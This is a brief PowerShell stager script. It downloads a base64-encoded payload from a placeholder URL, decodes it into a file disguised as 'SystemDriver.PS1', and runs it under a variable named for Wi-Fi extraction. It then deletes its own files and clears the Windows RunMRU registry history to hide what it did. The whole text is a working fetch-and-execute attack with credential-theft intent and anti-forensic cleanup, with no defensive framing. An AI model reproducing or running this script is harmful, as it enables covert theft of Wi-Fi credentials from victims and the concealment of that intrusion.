wget <URL TO RAW BASE64 VERSION OF SystemDriver.PS1> -OutFile SystemDriver.txt
$FileContents = Get-Content -Path $PSScriptRoot"\SystemDriver.txt"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($FileContents)) > $PSScriptRoot"\SystemDriver.PS1"
$WifiExtract = $PSScriptRoot+"\SystemDriver.PS1"
&$WifiExtract
Remove-Item .\SystemDriver.PS1 -Force
Remove-Item .\Explorer.PS1 -Force
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit